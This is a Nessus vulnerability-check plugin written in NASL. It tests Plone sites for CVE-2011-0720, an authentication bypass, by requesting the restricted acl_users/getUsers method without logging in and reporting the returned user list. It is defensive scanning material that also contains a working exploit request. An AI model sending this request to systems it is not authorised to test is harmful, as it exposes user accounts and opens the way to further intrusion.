#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(53546);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2016/11/17 15:28:26 $");

  script_cve_id("CVE-2011-0720");
  script_bugtraq_id(46102);
  script_osvdb_id(70753);
  script_xref(name:"Secunia", value:"43146");

  script_name(english:"Plone Security Bypass");
  script_summary(english:"Tries to access privileged object methods");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server has an application that that is affected by a
security bypass vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of Plone on the remote host fails to require
authentication to access several sensitive functions.

Plone is built on top of Zope, which maps Python objects and their
methods to URLs.  Methods can have security restrictions, such as
requiring a login account or a specific privilege level, applied to
them to limit access.  The installed version of Plone permits access
to several methods that allow the adding, deleting, and changing
content and users."
  );
  script_set_attribute(attribute:"see_also", value:"http://plone.org/products/plone/security/advisories/cve-2011-0720");
  script_set_attribute(
    attribute:"see_also",
    value:"http://seclists.org/fulldisclosure/2011/Apr/293"
  );
  script_set_attribute(attribute:"solution", value:"Apply Plone Hotfix CVE-2011-0720.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/02/02");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/02/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/04/25");

  script_set_attribute(attribute:"cpe", value:"cpe:/a:plone:plone");
  script_set_attribute(attribute:"plugin_type", value:"remote");

  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2016 Tenable Network Security, Inc.");

  script_dependencies("plone_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/plone");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("webapp_func.inc");

# Get details of Plone install.
port = get_http_port(default:80);
install = get_install_from_kb(appname:"plone", port:port, exit_on_fail:TRUE);
dir = install["dir"];

# Try to access a method that should be restricted to privileged, authenticated,
# users.
object = "acl_users";
method = "getUsers";
url = dir + "/" + object + "/" + method;
res = http_send_recv3(
  method       : "GET",
  item         : url,
  port         : port,
  exit_on_fail : TRUE
);

# If it's not a Python list, then we can assume it didn't work.
if (!ereg(string:res[2], pattern:"^\[.*\]$"))
  exit(0, "The Plone installation at " + build_url(port:port, qs:dir) + " is not affected.");

if (report_verbosity > 0)
{
  report =
    '\nNessus was able to exploit the issue using the following request :' +
    '\n' +
    '\n  ' + build_url(port:port, qs:url) +
    '\n';

  if (report_verbosity > 1)
    report +=
      '\nIt produced the following response :' +
      '\n' +
      '\n  ' + res[2];

  security_hole(port:port, extra:report + '\n');
}
else security_hole(port);
